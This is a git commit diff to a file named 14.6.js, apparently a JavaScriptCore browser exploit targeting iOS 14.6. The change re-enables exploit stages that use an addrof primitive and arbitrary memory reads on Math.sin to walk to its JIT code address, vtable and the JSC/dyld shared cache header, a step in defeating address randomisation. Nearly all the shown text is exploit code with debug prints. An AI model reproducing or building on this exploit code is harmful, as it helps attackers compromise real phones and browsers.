58fab3fdafaa257be244d4bdc80f8de7864caa45
Turnerhackz1 <turner881189@gmail.com>
2022-06-27 19:42:30 -0500

    Update 14.6.js

--- 14.6.js
+++ 14.6.js
@@ -636,9 +636,9 @@ for (var i = 0; i < 1000; ++i) {
    memory = stage2;
 	var sinFuncAddr = memory.addrof(Math.sin);
         print("Math.sin() @ " + sinFuncAddr);
-        //var executableAddr = memory.readInt64(Add(sinFuncAddr, 0x24));
-        //print("Math.sin() ExecutableAddr @ " + executableAddr);
-        /*var jitCodeAddr = memory.readInt64(Add(executableAddr,new Int64("0x24")));
+        var executableAddr = memory.readInt64(Add(sinFuncAddr, 24));
+        print("Math.sin() ExecutableAddr @ " + executableAddr);
+        var jitCodeAddr = memory.readInt64(Add(executableAddr,24));
 	print("Math.sin() jitCodeAddr @ " + jitCodeAddr);
         
         var vtab = memory.readInt64(jitCodeAddr);
@@ -646,7 +646,7 @@ for (var i = 0; i < 1000; ++i) {
         var anchor1 = memory.readInt64(vtab)
         print("anchor1" + anchor1);
         var jsc = Sub(anchor1, anchor1.lo() & 0xfff);
-	print('JSC header @' + jsc);*/ //dyld_cache_header
+	print('JSC header @' + jsc); //dyld_cache_header
         /*while(true)
         {
         if(strcmp(memory.read(jsc, 0x10), "dyld_v1   arm64")) //cache header magic
